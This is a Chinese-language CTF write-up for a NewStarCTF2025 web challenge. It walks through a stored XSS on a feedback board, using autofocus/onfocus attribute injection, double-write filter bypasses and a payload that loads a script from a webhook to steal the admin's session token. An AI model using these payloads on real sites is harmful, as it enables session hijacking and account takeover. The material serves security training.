---
title: 'NewStarCTF2025-Week4-Web 小 E 的留言板'
abbrlink: 875f4f46
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# NewStarCTF2025-Week4-Web 小 E 的留言板

### 题目：

小 E 的「Project X」系统现已经公开，于是专门为它写了一个用户体验反馈留言板。小 E  每天都会亲自登录这个平台，查看用户反馈，而他的所有关键会话凭证都「安全」地保存在浏览器中。但是这个留言板存在一个巨大漏洞，你是否能利用这个被他忽视的漏洞，向平台「注入」一段特殊的指令，从而在小 E 毫无察觉的情况下，窃取到他浏览器的核心会话令牌呢？

![image-20260329151250289](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260329151250373.png)

---

## 1. 知识点：

#### 1.html相关

**特性（Autofocus）**：这是 HTML5 的特性。页面一加载，浏览器会自动把光标投射到带有这个属性的输入框上。

**特性（Onfocus）**：这是一个事件监听器。它的逻辑是：“只要这个框获得了焦点（被选中），就立刻执行后面的 JavaScript 代码。

---

## 2. 思路：

### 1.初次尝试xss注入

以往遇到的xss都是有一个触发的按钮，我们点击之后就能触发。

在经过一系列操作后发现以下四个问题：

·过滤了空格，focus，尖括号，script，on

·我们传入的留言被放在了value里面，此时无论你传入什么，浏览器都会把它当成普通文本字符，也只会把这些字符放入内存中的一个字符串变量里

·没有代码执行的出发点：关键还是题目中说小e他只是查看我们的留言，实际上并不会点击任何东西，也就是不会手动触发任何东西，那我们该怎么执行我们的代码呢？

·代码里面的网址又有谁来访问呢？



![image-20260329141116343](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260329141116409.png)



---

### 2.尝试绕过（五个绕过事项）

#### 2.1 绕过value

```
<input type="text" class="form-control" value="1" readonly="" style="
        background: transparent;
        border: none;
        padding: 0;
        font-size: 16px;
        width: 100%;
      ">
```

可以看到图片中value的值用双引号包裹起来，我们可以也用`"`先闭合前一个双引号；

然后再用空格,让解析器意识到空格后面输入的“autofocus......”不再是value值，而是另外一个input属性了；

```
构造payload：" 
```

#### 2.2 触发代码

手动触发不行，就试试自动触发：

首先，确定触发点->用到autofocus自动聚焦到此属性所在的输入框上

自动触发->用onfocus监听：只要所在的输入框被选中（聚焦），就能够触发后面的js代码

```
构造payload：" autofocus onfocus="...具体代码...
```

这里的引号不闭合只因为value本身后面已经有一个引号了，再写一个语法就错了

#### 2.3 关联外带地址

先了解一些这个传递模式：

![image-20260329151928742](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260329151928789.png)

打开外网映射地址，下面的url就是我们需要小e访问的url

![image-20260329145015726](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260329145015817.png)

我们想要构造的代码是

```
<script src="http://localhost:9000/webhook/fee2323a/"></script>
```

那么payload就是

```
构造payload：" autofocus onfocus="var sc=document.createElement('script'),s.src='http://localhost:9000/webhook/fee2323a/'
```

但是如果直接这么写上去会出现一个问题：没人会去打开src的url

#### 2.4 自动访问外带地址

用appendchild激活 浏览器的自动访问功能->

我们把带有网址的src那一串代码插入到 html的head 里面

浏览器的渲染引擎会发现多了一个script节点，里面有src，引擎会让后面请求这个src的url

```
构造payload:" autofocus onfocus="var sc=document.createElement('script');sc.src='http://localhost:9000/webhook/2114ed1b/';document.head.appendChild(sc)
```

#### 2.5 双写绕过

之前最前面提到了过滤了一些东西，我们可以用双写绕过

```
" autofofocuscus oonnfofocuscus="var s=document.createElement('scrscriptipt');s.src='http://localhost:9000/webhook/2114ed1b/';document.head.appendChild(s)
```

最后提醒一点，onfocus里面语句间用分号间隔

---

## 3. exp

留言板传入代码，打开外网映射地址，得到数据

（这里的url不一样是因为我做了两遍）

![image-20260329134709300](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260329134709524.png)



## 4. 后话：

#### 为什么要用到Webhook Receiver？

为了拿到小e浏览器里面的核心会话令牌（数据），小e在浏览器自动打开src里的url时会传递数据，但是拿到数据的是 `localhost:9000`

而我们通过映射链接，映射到 `localhost:9000`，就可以看到具体内容了

**内网**：小e 在题目容器内访问 `localhost:9000` （但不知道与此同时并投递了数据）。

**外网**：我们通过题目提供的**映射链接**（Webhook 界面），可以拿到 那个内网localhost:9000里收到的数据。